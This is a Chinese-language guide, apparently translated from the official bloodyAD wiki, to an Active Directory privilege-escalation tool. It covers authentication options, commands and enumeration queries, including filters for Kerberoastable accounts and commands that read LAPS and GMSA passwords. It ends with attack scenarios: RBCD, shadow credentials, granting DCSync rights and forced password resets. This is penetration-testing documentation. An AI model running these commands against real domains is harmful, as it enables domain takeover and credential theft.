---
title: bloodyAD 中文指南
date: 2026-04-08 12:00:00
categories:
  - 工具wiki
tags:
  - 工具wiki
---

# bloodyAD 中文指南

## 简介

bloodyAD 是一个强大的 Active Directory 提权工具，被称为"AD 提权的瑞士军刀"。它提供了全面的功能来枚举、操作和利用 Active Directory 环境。

## 目录

- [安装](#安装)
- [认证方法](#认证方法)
- [全局参数](#全局参数)
- [命令详解](#命令详解)
- [枚举技术](#枚举技术)
- [访问控制](#访问控制)
- [实战示例](#实战示例)

---

## 安装

### 依赖项

- Python 3
- MSLDAP
- dnspython

### 安装步骤

**方法一：通过 pip 安装**

```bash
pip install bloodyAD
bloodyAD --host 172.16.1.15 -d bloody.local -k set password john.doe 'Password123!'
```

**方法二：从源码安装**

```bash
git clone --depth 1 https://github.com/CravateRouge/bloodyAD
pip install .
bloodyAD --host 172.16.1.15 -d bloody.local -k set password john.doe 'Password123!'
```

---

## 认证方法

### NTLM 认证

当指定 `-p` 参数时默认使用 NTLM 认证，支持 LDAP/LDAPS。

```bash
# 使用密码
-p 'Password123!'

# 使用哈希
-p :2B576ACBE6BCFDA7294D6BD18041B8FE

# 使用 base64 或 hex 格式
-p <password> -f b64
-p <password> -f hex
```

如果不指定 `-p`，将尝试使用 SSPI 会话中存储的凭据进行集成 Windows 认证。

### Kerberos 认证

启用 `-k` 参数时使用 Kerberos 认证，支持 LDAP/LDAPS。

**支持的认证方式：**

1. **集成 Windows 认证**（票据存储在 SSPI 会话中）

   ```bash
   -k
   ```

2. **使用密码**

   ```bash
   -k -p 'Password123!'
   ```

3. **使用 AES 或 RC4 密钥**

   ```bash
   -k -p <key> -f aes
   -k -p <key> -f rc4
   ```

4. **使用 TGT 或 ST（ccache/kirbi/keytab 格式）**

   ```bash
   -k ccache=ticket.ccache
   -k kirbi=ticket.kirbi
   -k keytab=ticket.keytab
   ```

5. **使用 PEM 或 PFX 格式**

   ```bash
   -k pem=cert.pem
   -k pfx=cert.pfx
   ```

6. **使用 Windows 证书存储**
   ```bash
   -c
   ```

**跨域认证：**

如果执行跨域认证（凭据来自域 A，要在域 B 上使用，且域 B 信任域 A），需要提供：

```bash
-k kirbi=ticket.kirbi kdc=192.168.100.1 kdcc=192.168.120.1 realmc=DomB
```

> ⚠️ **注意：** 必须在 `--host` 中设置 DC 的主机名而不是 IP（如果主机名没有 DNS 解析，可以在 `--dc-ip` 中提供 IP）

### 证书认证

支持 P12 或 PFX 证书。

```bash
# 密钥和证书分开的文件
-c Administrator.key:Administrator.crt

# 密钥和证书合并在同一文件
-c :Administrator.pem

# 如果证书有密码保护
-c Administrator.key:Administrator.crt -p 'cert_password'
```

**生成证书：**

```bash
# 获取 CA 机构名称
certipy find -u Administrator@bloody -p 'Password123!' -dc-ip 192.168.10.2

# 获取 PFX
certipy req -u Administrator@bloody.local -p 'Password123!' -target 192.168.10.2 -ca bloody-DC01-CA -template User

# 转换 PFX 到 PEM
openssl pkcs12 -in administrator.pfx -out administrator.pem -nodes
```

### LDAPS

添加 `-s` 标志启用 LDAPS。默认情况下 AD 不支持 LDAPS（端口 636），需要启用并设置证书颁发机构服务器。

---

## 全局参数

```bash
bloodyAD [-h] [-d DOMAIN] [-u USERNAME] [-p PASSWORD]
         [-k [KERBEROS ...]] [-f {b64,hex,aes,rc4,default}]
         [-c [CERTIFICATE]] [-s] -H HOST [-i DC_IP] [--dns DNS]
         [-t TIMEOUT] [--gc] [-v {QUIET,INFO,DEBUG,TRACE}] [--json]
         {add,get,msldap,remove,set} ...
```

### 参数说明

| 参数                | 说明                                                                        |
| ------------------- | --------------------------------------------------------------------------- |
| `-d, --domain`      | NTLM 认证使用的域名                                                         |
| `-u, --username`    | NTLM 认证使用的用户名                                                       |
| `-p, --password`    | NTLM 认证的密码或 LMHASH:NTHASH，Kerberos 的密码或 AES/RC4 密钥，证书的密码 |
| `-k, --kerberos`    | 启用 Kerberos 认证                                                          |
| `-f, --format`      | 指定 `--password` 或 `-k <keyfile>` 的格式（b64/hex/aes/rc4/default）       |
| `-c, --certificate` | Schannel 认证或 krb pkinit（如果同时提供 -k）                               |
| `-s, --secure`      | 使用 LDAP/GC over TLS（LDAPS/GCS）                                          |
| `-H, --host`        | DC 的主机名或 IP                                                            |
| `-i, --dc-ip`       | DC 的 IP（当 --host 无法解析时有用）                                        |
| `--dns`             | 用于解析 AD 名称的 DNS IP                                                   |
| `-t, --timeout`     | 连接超时时间（秒）                                                          |
| `--gc`              | 连接到全局编录（GC）                                                        |
| `-v, --verbose`     | 调整输出详细程度（QUIET/INFO/DEBUG/TRACE）                                  |
| `--json`            | 以 JSON 格式输出结果                                                        |

### 命令类别

- `add` - 添加功能类别
- `get` - 获取功能类别
- `msldap` - MSLDAP 功能类别
- `remove` - 删除功能类别
- `set` - 设置功能类别

---

## 命令详解

### ADD 命令

#### add badSuccessor

添加新的 DMSA（专用托管服务账户）对象。

```bash
bloodyAD add badSuccessor [-t T] [--ou OU] dmsa
```

| 参数      | 说明                                         |
| --------- | -------------------------------------------- |
| `dmsa`    | DMSA 对象的主机名（无需添加 '$'）            |
| `-t T`    | 要承担其权限的目标的可分辨名称（可多次调用） |
| `--ou OU` | DMSA 对象的组织单位                          |

#### add computer

添加新计算机账户。

```bash
bloodyAD add computer [--ou OU] [--lifetime LIFETIME] hostname newpass
```

| 参数         | 说明                                         |
| ------------ | -------------------------------------------- |
| `hostname`   | 计算机名（不带尾随 $）                       |
| `newpass`    | 计算机密码                                   |
| `--ou OU`    | 计算机的组织单位                             |
| `--lifetime` | 新计算机的生存期（秒），非零则创建为动态对象 |

> 💡 **提示：** 确保提供域 FQDN 作为域全局参数 `-d bloody.lab`

#### add dcsync

在域上添加 DCSync 权限。

```bash
bloodyAD add dcsync trustee
```

| 参数      | 说明                               |
| --------- | ---------------------------------- |
| `trustee` | 受托人的 sAMAccountName、DN 或 SID |

**要求：** 拥有域对象或在域对象上有 WriteDacl 权限

#### add dnsRecord

在 AD 环境中添加新的 DNS 记录。

```bash
bloodyAD add dnsRecord [--dnstype {A,AAAA,CNAME,MX,PTR,SRV,TXT}]
                       [--zone ZONE] [--ttl TTL] name data
```

| 参数        | 说明                         |
| ----------- | ---------------------------- |
| `name`      | DNS 节点对象的名称（主机名） |
| `data`      | DNS 记录数据                 |
| `--dnstype` | DNS 记录类型（默认：A）      |
| `--zone`    | DNS 区域（默认：当前域）     |
| `--ttl`     | DNS 记录 TTL（默认：300）    |

**示例：**

```bash
bloodyAD --host 10.1.0.4 -u bloodyAdmin -p 'Password123!' -d bloody add dnsRecord test.bloody.local 8.8.8.8
```

#### add genericAll

授予受托人对目标及其后代的完全控制权。

```bash
bloodyAD add genericAll target trustee
```

**要求：** 必须拥有对象或具有 WriteDacl 权限

#### add groupMember

向组添加新成员。

```bash
bloodyAD add groupMember group member
```

> 📝 **注意：** 支持外部用户

#### add rbcd

添加基于资源的约束委派。

```bash
bloodyAD add rbcd target service
```

**要求：**

- 对目标的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 有"写入"权限
- Windows Server >= 2012

#### add shadowCredentials

添加密钥凭据到目标，并使用这些凭据通过 PKINIT 检索 TGT 和 NT 哈希。

```bash
bloodyAD add shadowCredentials [--path PATH] target
```

> ⚠️ **警告：**
>
> - DC 必须运行 Windows Server 2016 或更高版本
> - 域中必须启用 AD CS 或设置证书颁发机构

#### add uac

添加属性标志以更改用户/计算机对象行为。

```bash
bloodyAD add uac [-f F] target
```

**示例：**

```bash
bloodyAD add uac -f DONT_REQ_PREAUTH -f DONT_EXPIRE_PASSWORD target
```

#### add user

添加新用户。

```bash
bloodyAD add user [--ou OU] [--lifetime LIFETIME] sAMAccountName newpass
```

---

### GET 命令

#### get bloodhound

BloodHound CE 收集器。

```bash
bloodyAD get bloodhound [--transitive] [--path PATH]
```

> ⚠️ **警告：** 此脚本仍在开发中，仅提供基本功能

#### get children

列出给定目标对象的子对象。

```bash
bloodyAD get children [--target TARGET] [--otype OTYPE] [--direct]
```

| 参数       | 说明                                             |
| ---------- | ------------------------------------------------ |
| `--target` | 目标的 sAMAccountName、DN 或 SID（默认：DOMAIN） |
| `--otype`  | 对象类型，如 useronly、user、computer、group 等  |
| `--direct` | 仅获取目标的直接子对象                           |

#### get dnsDump

检索用户可读/可列出的 AD DNS 记录。

```bash
bloodyAD get dnsDump [--zone ZONE] [--no-detail] [--transitive]
```

#### get membership

检索目标所属的所有组的 SID 和 SAM 账户名。

```bash
bloodyAD get membership [--no-recurse] target
```

#### get object

检索目标对象的 LDAP 属性。

```bash
bloodyAD get object [--attr ATTR] [--resolve-sd] [--raw] [--transitive] target
```

**示例：**

```bash
# 获取组成员
bloodyAD get object "Domain Admins" --attr member

# 获取用户账户控制标志
bloodyAD get object john.doe --attr userAccountControl

# 读取 GMSA 账户密码
bloodyAD get object 'gmsaAccount$' --attr msDS-ManagedPassword

# 读取 LAPS 密码
bloodyAD get object 'COMPUTER$' --attr ms-Mcs-AdmPwd
```

#### get search

在 LDAP 数据库中搜索。

```bash
bloodyAD get search [--base BASE] [--filter FILTER] [--attr ATTR]
                    [--resolve-sd] [--raw] [--transitive]
```

**示例：**

```bash
# 按二进制属性过滤
bloodyAD get search --filter '(attributeSecurityGuid=b\BC\05X\C9\BD\28D\A5\E2\85j\0FL\18\5E)' --attr=ldapDisplayName
```

#### get trusts

显示信任关系。

```bash
bloodyAD get trusts [--transitive]
```

- `A->B` 表示 A 可以在 B 上认证
- `A-<B` 表示 B 可以在 A 上认证
- `A-<>B` 表示双向

#### get writable

检索客户端可写入的对象。

```bash
bloodyAD get writable [--otype {ALL,OU,USER,COMPUTER,GROUP,DOMAIN,GPO}]
                      [--right {ALL,WRITE,CHILD}] [--detail]
```

---

### SET 命令

#### set password

设置用户密码。

```bash
bloodyAD set password target newpass
```

**要求：** 必须对目标有 EXTENDED_RIGHT_FORCE_CHANGE_PWD 权限

#### set rbcd

设置基于资源的约束委派。

```bash
bloodyAD set rbcd target service
```

---

### REMOVE 命令

#### remove dnsRecord

从 AD 环境中删除 DNS 记录。

```bash
bloodyAD remove dnsRecord [--zone ZONE] [--forest] name data
```

#### remove groupMember

从组中删除成员。

```bash
bloodyAD remove groupMember group member
```

#### remove object

删除对象。

```bash
bloodyAD remove object target
```

#### remove uac

删除用户账户控制标志。

```bash
bloodyAD remove uac [-f F] target
```

---

## 枚举技术

### 获取 AD 林功能级别

```bash
bloodyAD get object 'DC=crash,DC=lab' --attr msDS-Behavior-Version
```

### 获取机器账户配额（MAQ）

```bash
# 所有用户的配额
bloodyAD get object 'DC=crash,DC=lab' --attr ms-DS-MachineAccountQuota

# 当前用户的有效配额
bloodyAD get object 'CN=NTDS Quotas,DC=crash,DC=lab' --attr msDS-QuotaEffective

# 当前用户已创建的机器数量
bloodyAD get object 'CN=NTDS Quotas,DC=crash,DC=lab' --attr msDS-QuotaUsed
```

### 获取最小密码长度

```bash
bloodyAD get object 'DC=crash,DC=lab' --attr minPwdLength
```

### 获取所有用户

```bash
bloodyAD get children --otype useronly
```

### 获取所有计算机

```bash
bloodyAD get children --otype computer
```

### 获取所有容器

```bash
bloodyAD get children --otype container
```

### 获取所有信任关系

```bash
bloodyAD get children --otype trustedDomain
```

### 获取可 Kerberoast 的账户

```bash
bloodyAD get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName
```

### 获取不需要 Kerberos 预认证的账户（AS-REP）

```bash
bloodyAD get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```

### 获取所有 DNS 记录

```bash
bloodyAD get dnsDump
```

### 检查 ADIDNS 是否有通配符条目

```bash
bloodyAD get dnsDump | sed -n '/[^\n]*\*/,/^$/p'
```

---

## 访问控制

### 安全描述符解析功能

使用 `--resolve-sd` 可以解析安全描述符以获得人类可理解的权限集。

### 权限结构

```
Type: == ALLOWED_OBJECT ==     # 描述是允许、拒绝还是审核权限
Trustee: jane.doe              # 能够使用权限的主体
Right: WRITE_DACL              # 受托人可以使用的权限类型
ObjectType: Self               # 适用的对象类型
InheritedObjectType: account   # 继承此权限的对象类型
Flags: INHERIT_ONLY|CONTAINER_INHERIT  # 指定特殊行为
```

### 权限类型

| bloodyAD 名称  | 官方 AD 名称            | 描述                                                  |
| -------------- | ----------------------- | ----------------------------------------------------- |
| CREATE_CHILD   | RIGHT_DS_CREATE_CHILD   | 创建对象的子对象                                      |
| DELETE_CHILD   | RIGHT_DS_DELETE_CHILD   | 删除对象的子对象                                      |
| DELETE_TREE    | RIGHT_DS_DELETE_TREE    | 使用删除树操作删除对象及其子树                        |
| READ_PROP      | RIGHT_DS_READ_PROPERTY  | 读取对象属性（不包括 SD）                             |
| WRITE_PROP     | RIGHT_DS_WRITE_PROPERTY | 写入属性（不包括 SD）                                 |
| WRITE_DACL     | RIGHT_WRITE_DAC         | 修改 SD DACL（对象权限）                              |
| WRITE_OWNER    | RIGHT_WRITE_OWNER       | 将自己设置为所有者                                    |
| DELETE         | RIGHT_DELETE            | 删除对象                                              |
| CONTROL_ACCESS | RIGHT_DS_CONTROL_ACCESS | 执行 ACE 对象类型中描述的特殊权限                     |
| GENERIC_ALL    | RIGHT_GENERIC_ALL       | 除 ACCESS_SYSTEM_SECURITY 和 SYNCHRONIZE 外的所有权限 |

### 属性集

| 属性集               | 包含的属性                                                                                                                       |
| -------------------- | -------------------------------------------------------------------------------------------------------------------------------- |
| Domain-Password      | lockOutObservationWindow, lockoutDuration, lockoutThreshold, maxPwdAge, minPwdAge, minPwdLength, pwdHistoryLength, pwdProperties |
| General-Information  | comment, uid, sIDHistory, sAMAccountName, primaryGroupID, objectSid, displayName 等                                              |
| Account-Restrictions | msDS-AllowedToActOnBehalfOfOtherIdentity, userAccountControl, pwdLastSet, accountExpires 等                                      |
| Group-Membership     | member, memberOf                                                                                                                 |
| Personal-Information | userCertificate, telephoneNumber, street, postalCode, thumbnailPhoto 等                                                          |

### 验证写入

| 验证写入                | 描述                               |
| ----------------------- | ---------------------------------- |
| Self-Membership         | 从组中添加/删除自己（member 属性） |
| Validated-DNS-Host-Name | dNSHostName 属性值必须符合格式要求 |
| Validated-SPN           | SPN 验证                           |

---

## 实战示例

### 场景一：添加计算机账户并设置 RBCD

```bash
# 添加新计算机账户
bloodyAD --host dc.bloody.local -d bloody -u user -p 'pass' add computer evilpc 'Password123!'

# 设置 RBCD
bloodyAD --host dc.bloody.local -d bloody -u user -p 'pass' add rbcd target$ evilpc$
```

### 场景二：Shadow Credentials 攻击

```bash
# 添加密钥凭据
bloodyAD --host dc.bloody.local -d bloody -u user -p 'pass' add shadowCredentials targetuser

# 将生成 TGT ccache 或 pfx 文件
```

### 场景三：DCSync 权限添加

```bash
# 给用户添加 DCSync 权限
bloodyAD --host dc.bloody.local -d bloody -u admin -p 'pass' add dcsync attacker
```

### 场景四：密码修改

```bash
# 修改用户密码
bloodyAD --host dc.bloody.local -d bloody -u admin -p 'pass' set password targetuser 'NewPassword123!'
```

### 场景五：查找可写入对象

```bash
# 查找所有可写入的对象
bloodyAD get writable --detail

# 仅查找可写入的用户对象
bloodyAD get writable --otype USER --right WRITE --detail
```

---

## 注意事项

1. **权限要求**：大多数操作需要相应的 AD 权限，请确保账户具有足够的权限
2. **日志记录**：AD 操作会被记录，请注意操作痕迹
3. **测试环境**：建议先在测试环境中验证操作
4. **版本兼容性**：某些功能需要特定版本的 Windows Server

---

## 参考资源

- 官方 GitHub: https://github.com/CravateRouge/bloodyAD
- 更多示例: https://cravaterouge.com/articles/
- Microsoft AD 文档: [MS-ADTS]

---

_本指南基于 bloodyAD 官方 Wiki 翻译整理_
